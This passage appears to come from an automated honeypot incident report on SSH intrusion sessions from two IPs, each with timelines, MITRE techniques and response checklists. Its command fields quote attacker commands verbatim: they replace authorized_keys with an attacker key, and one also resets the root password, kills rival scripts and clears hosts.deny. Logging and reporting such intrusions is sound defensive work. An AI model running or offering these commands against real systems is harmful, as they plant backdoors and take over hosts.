| `2026-05-28 10:52:59` | `cowrie.command.input` |
| `2026-05-28 10:52:59` | `cowrie.command.input` |
| `2026-05-28 10:52:59` | `cowrie.log.closed` |
| `2026-05-28 10:52:59` | `cowrie.session.params` |
| `2026-05-28 10:52:59` | `cowrie.command.input` |
| `2026-05-28 10:53:00` | `cowrie.log.closed` |
| `2026-05-28 10:53:00` | `cowrie.session.params` |
| `2026-05-28 10:53:00` | `cowrie.command.input` |
| `2026-05-28 10:53:00` | `cowrie.log.closed` |
| `2026-05-28 10:53:00` | `cowrie.session.params` |
| `2026-05-28 10:53:00` | `cowrie.command.input` |
| `2026-05-28 10:53:01` | `cowrie.log.closed` |
| `2026-05-28 10:53:01` | `cowrie.session.params` |
| `2026-05-28 10:53:01` | `cowrie.command.input` |
| `2026-05-28 10:53:01` | `cowrie.log.closed` |
| `2026-05-28 10:53:02` | `cowrie.session.params` |
| `2026-05-28 10:53:02` | `cowrie.command.input` |
| `2026-05-28 10:53:02` | `cowrie.log.closed` |
| `2026-05-28 10:53:02` | `cowrie.session.params` |
| `2026-05-28 10:53:02` | `cowrie.command.input` |
| `2026-05-28 10:53:02` | `cowrie.log.closed` |
| `2026-05-28 10:53:03` | `cowrie.session.params` |
| `2026-05-28 10:53:03` | `cowrie.command.input` |
| `2026-05-28 10:53:03` | `cowrie.log.closed` |
| `2026-05-28 10:53:03` | `cowrie.session.params` |
| `2026-05-28 10:53:03` | `cowrie.command.input` |
| `2026-05-28 10:53:03` | `cowrie.log.closed` |
| `2026-05-28 10:53:04` | `cowrie.session.params` |
| `2026-05-28 10:53:04` | `cowrie.command.input` |
| `2026-05-28 10:53:04` | `cowrie.log.closed` |
| `2026-05-28 10:53:04` | `cowrie.session.params` |
| `2026-05-28 10:53:04` | `cowrie.command.input` |
| `2026-05-28 10:53:04` | `cowrie.log.closed` |
| `2026-05-28 10:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687c29fbc640

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-05-28 10:53 |
| **Last Seen** | 2026-05-28 10:54 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1YOsAKgjYqbv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:53:49` | `cowrie.session.connect` |
| `2026-05-28 10:53:49` | `cowrie.client.version` |
| `2026-05-28 10:53:50` | `cowrie.client.kex` |
| `2026-05-28 10:53:50` | `cowrie.login.success` |
| `2026-05-28 10:53:51` | `cowrie.session.params` |
| `2026-05-28 10:53:51` | `cowrie.command.input` |
| `2026-05-28 10:53:51` | `cowrie.command.failed` |
| `2026-05-28 10:53:52` | `cowrie.log.closed` |
| `2026-05-28 10:53:53` | `cowrie.session.params` |
| `2026-05-28 10:53:53` | `cowrie.command.input` |
| `2026-05-28 10:53:53` | `cowrie.session.file_download` |
| `2026-05-28 10:53:53` | `cowrie.log.closed` |
| `2026-05-28 10:54:06` | `cowrie.session.params` |
| `2026-05-28 10:54:06` | `cowrie.command.input` |
| `2026-05-28 10:54:06` | `cowrie.log.closed` |
| `2026-05-28 10:54:06` | `cowrie.session.params` |
| `2026-05-28 10:54:06` | `cowrie.command.input` |
| `2026-05-28 10:54:06` | `cowrie.log.closed` |
| `2026-05-28 10:54:07` | `cowrie.session.params` |
| `2026-05-28 10:54:07` | `cowrie.command.input` |
| `2026-05-28 10:54:07` | `cowrie.session.file_download` |
| `2026-05-28 10:54:07` | `cowrie.log.closed` |
| `2026-05-28 10:54:07` | `cowrie.session.params` |
| `2026-05-28 10:54:07` | `cowrie.command.input` |
| `2026-05-28 10:54:07` | `cowrie.log.closed` |
| `2026-05-28 10:54:08` | `cowrie.session.params` |
| `2026-05-28 10:54:08` | `cowrie.command.input` |
| `2026-05-28 10:54:08` | `cowrie.log.closed` |
| `2026-05-28 10:54:08` | `cowrie.session.params` |
| `2026-05-28 10:54:08` | `cowrie.command.input` |
| `2026-05-28 10:54:08` | `cowrie.command.input` |
| `2026-05-28 10:54:08` | `cowrie.log.closed` |
| `2026-05-28 10:54:09` | `cowrie.session.params` |
| `2026-05-28 10:54:09` | `cowrie.command.input` |
| `2026-05-28 10:54:09` | `cowrie.log.closed` |
| `2026-05-28 10:54:09` | `cowrie.session.params` |
| `2026-05-28 10:54:09` | `cowrie.command.input` |
| `2026-05-28 10:54:09` | `cowrie.log.closed` |
| `2026-05-28 10:54:10` | `cowrie.session.params` |
| `2026-05-28 10:54:10` | `cowrie.command.input` |
| `2026-05-28 10:54:10` | `cowrie.log.closed` |
| `2026-05-28 10:54:10` | `cowrie.session.params` |
| `2026-05-28 10:54:10` | `cowrie.command.input` |
| `2026-05-28 10:54:10` | `cowrie.log.closed` |
| `2026-05-28 10:54:11` | `cowrie.session.params` |
| `2026-05-28 10:54:11` | `cowrie.command.input` |
| `2026-05-28 10:54:11` | `cowrie.log.closed` |
| `2026-05-28 10:54:11` | `cowrie.session.params` |
| `2026-05-28 10:54:11` | `cowrie.command.input` |
| `2026-05-28 10:54:11` | `cowrie.log.closed` |
| `2026-05-28 10:54:12` | `cowrie.session.params` |
| `2026-05-28 10:54:12` | `cowrie.command.input` |
| `2026-05-28 10:54:12` | `cowrie.log.closed` |
| `2026-05-28 10:54:12` | `cowrie.session.params` |
| `2026-05-28 10:54:12` | `cowrie.command.input` |
| `2026-05-28 10:54:13` | `cowrie.log.closed` |
| `2026-05-28 10:54:13` | `cowrie.session.params` |
| `2026-05-28 10:54:13` | `cowrie.command.input` |
| `2026-05-28 10:54:13` | `cowrie.log.closed` |
| `2026-05-28 10:54:13` | `cowrie.session.params` |
| `2026-05-28 10:54:13` | `cowrie.command.input` |
| `2026-05-28 10:54:14` | `cowrie.log.closed` |
| `2026-05-28 10:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba63952934f6

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 10:57 |
| **Last Seen** | 2026-05-28 10:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:57:15` | `cowrie.session.connect` |
| `2026-05-28 10:57:15` | `cowrie.client.version` |
| `2026-05-28 10:57:15` | `cowrie.client.kex` |
| `2026-05-28 10:57:17` | `cowrie.login.success` |
| `2026-05-28 10:57:17` | `cowrie.session.params` |
| `2026-05-28 10:57:17` | `cowrie.command.input` |
| `2026-05-28 10:57:17` | `cowrie.command.failed` |
| `2026-05-28 10:57:18` | `cowrie.log.closed` |
| `2026-05-28 10:57:18` | `cowrie.session.params` |
| `2026-05-28 10:57:18` | `cowrie.command.input` |
| `2026-05-28 10:57:18` | `cowrie.session.file_download` |
| `2026-05-28 10:57:18` | `cowrie.log.closed` |
| `2026-05-28 10:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b850d55a408b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 10:57 |
| **Last Seen** | 2026-05-28 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:57:22` | `cowrie.session.connect` |
| `2026-05-28 10:57:22` | `cowrie.client.version` |
| `2026-05-28 10:57:22` | `cowrie.client.kex` |
| `2026-05-28 10:57:23` | `cowrie.login.success` |
| `2026-05-28 10:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39af9a59f31c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 10:59 |
| **Last Seen** | 2026-05-28 10:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:59:00` | `cowrie.session.connect` |
| `2026-05-28 10:59:00` | `cowrie.client.version` |
| `2026-05-28 10:59:01` | `cowrie.client.kex` |
| `2026-05-28 10:59:02` | `cowrie.login.success` |
| `2026-05-28 10:59:03` | `cowrie.session.params` |
| `2026-05-28 10:59:03` | `cowrie.command.input` |
| `2026-05-28 10:59:03` | `cowrie.command.failed` |
| `2026-05-28 10:59:03` | `cowrie.log.closed` |
| `2026-05-28 10:59:04` | `cowrie.session.params` |
| `2026-05-28 10:59:04` | `cowrie.command.input` |
| `2026-05-28 10:59:04` | `cowrie.session.file_download` |
| `2026-05-28 10:59:04` | `cowrie.log.closed` |
| `2026-05-28 10:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae0aa8cf92f6

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 10:59 |
| **Last Seen** | 2026-05-28 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:59:07` | `cowrie.session.connect` |
| `2026-05-28 10:59:07` | `cowrie.client.version` |
| `2026-05-28 10:59:08` | `cowrie.client.kex` |
| `2026-05-28 10:59:09` | `cowrie.login.success` |
| `2026-05-28 10:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34c4962a623

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:06 |
| **Last Seen** | 2026-05-28 11:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:06:07` | `cowrie.session.connect` |
| `2026-05-28 11:06:07` | `cowrie.client.version` |
| `2026-05-28 11:06:07` | `cowrie.client.kex` |
| `2026-05-28 11:06:08` | `cowrie.login.success` |
| `2026-05-28 11:06:09` | `cowrie.session.params` |
| `2026-05-28 11:06:09` | `cowrie.command.input` |
| `2026-05-28 11:06:09` | `cowrie.command.failed` |
| `2026-05-28 11:06:10` | `cowrie.log.closed` |
| `2026-05-28 11:06:10` | `cowrie.session.params` |
| `2026-05-28 11:06:10` | `cowrie.command.input` |
| `2026-05-28 11:06:10` | `cowrie.session.file_download` |
| `2026-05-28 11:06:10` | `cowrie.log.closed` |
| `2026-05-28 11:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8533d3641e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:06 |
| **Last Seen** | 2026-05-28 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:06:14` | `cowrie.session.connect` |
| `2026-05-28 11:06:14` | `cowrie.client.version` |
| `2026-05-28 11:06:14` | `cowrie.client.kex` |
| `2026-05-28 11:06:15` | `cowrie.login.success` |
| `2026-05-28 11:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50bb5eeb61ee

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:07 |
| **Last Seen** | 2026-05-28 11:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:07:55` | `cowrie.session.connect` |
| `2026-05-28 11:07:55` | `cowrie.client.version` |
| `2026-05-28 11:07:55` | `cowrie.client.kex` |
| `2026-05-28 11:07:56` | `cowrie.login.success` |
| `2026-05-28 11:07:57` | `cowrie.session.params` |
| `2026-05-28 11:07:57` | `cowrie.command.input` |
| `2026-05-28 11:07:57` | `cowrie.command.failed` |
| `2026-05-28 11:07:58` | `cowrie.log.closed` |
| `2026-05-28 11:07:58` | `cowrie.session.params` |
| `2026-05-28 11:07:58` | `cowrie.command.input` |
| `2026-05-28 11:07:58` | `cowrie.session.file_download` |
| `2026-05-28 11:07:58` | `cowrie.log.closed` |
| `2026-05-28 11:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8816ba9575e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:08 |
| **Last Seen** | 2026-05-28 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:08:02` | `cowrie.session.connect` |
| `2026-05-28 11:08:02` | `cowrie.client.version` |
| `2026-05-28 11:08:02` | `cowrie.client.kex` |
| `2026-05-28 11:08:03` | `cowrie.login.success` |
| `2026-05-28 11:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03f477457cf

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:09 |
| **Last Seen** | 2026-05-28 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:09:45` | `cowrie.session.connect` |
| `2026-05-28 11:09:45` | `cowrie.client.version` |
| `2026-05-28 11:09:45` | `cowrie.client.kex` |
| `2026-05-28 11:09:47` | `cowrie.login.success` |
| `2026-05-28 11:09:47` | `cowrie.session.params` |
| `2026-05-28 11:09:47` | `cowrie.command.input` |
| `2026-05-28 11:09:47` | `cowrie.command.failed` |
| `2026-05-28 11:09:48` | `cowrie.log.closed` |
| `2026-05-28 11:09:48` | `cowrie.session.params` |
| `2026-05-28 11:09:48` | `cowrie.command.input` |
| `2026-05-28 11:09:48` | `cowrie.session.file_download` |
| `2026-05-28 11:09:48` | `cowrie.log.closed` |
| `2026-05-28 11:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9512fc99bef1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:09 |
| **Last Seen** | 2026-05-28 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:09:52` | `cowrie.session.connect` |
| `2026-05-28 11:09:52` | `cowrie.client.version` |
| `2026-05-28 11:09:52` | `cowrie.client.kex` |
| `2026-05-28 11:09:53` | `cowrie.login.success` |
| `2026-05-28 11:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-375f2612952e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:16 |
| **Last Seen** | 2026-05-28 11:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:16:55` | `cowrie.session.connect` |
| `2026-05-28 11:16:55` | `cowrie.client.version` |
| `2026-05-28 11:16:56` | `cowrie.client.kex` |
| `2026-05-28 11:16:57` | `cowrie.login.success` |
| `2026-05-28 11:16:58` | `cowrie.session.params` |
| `2026-05-28 11:16:58` | `cowrie.command.input` |
| `2026-05-28 11:16:58` | `cowrie.command.failed` |
| `2026-05-28 11:16:58` | `cowrie.log.closed` |
| `2026-05-28 11:16:59` | `cowrie.session.params` |
| `2026-05-28 11:16:59` | `cowrie.command.input` |
| `2026-05-28 11:16:59` | `cowrie.session.file_download` |
| `2026-05-28 11:16:59` | `cowrie.log.closed` |
| `2026-05-28 11:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7825de1f61b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:17 |
| **Last Seen** | 2026-05-28 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:17:02` | `cowrie.session.connect` |
| `2026-05-28 11:17:02` | `cowrie.client.version` |
| `2026-05-28 11:17:03` | `cowrie.client.kex` |
| `2026-05-28 11:17:04` | `cowrie.login.success` |
| `2026-05-28 11:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c27a9a1337f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:20 |
| **Last Seen** | 2026-05-28 11:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
